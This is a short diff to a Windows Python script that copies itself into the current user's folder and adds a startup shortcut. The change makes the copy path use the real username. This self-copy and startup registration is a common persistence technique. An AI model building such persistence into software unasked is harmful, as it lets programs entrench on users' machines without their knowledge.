@@ -1,7 +1,7 @@
 import os
 import shutil
 import sys
-import ctypes
+import getpass
 import pythoncom
 from win32com.shell import shell
 import subprocess
@@ -24,7 +24,7 @@ def add_to_startup(target_path):
     persist_file.Save(shortcut_path, 0)
 
 def copy_to_user_folder():
-    user_folder = os.path.join("C:\\", "Users", "user")
+    user_folder = os.path.join("C:\\", "Users", getpass.getuser())
     target_path = os.path.join(user_folder, os.path.basename(sys.argv[0]))
 
     try:
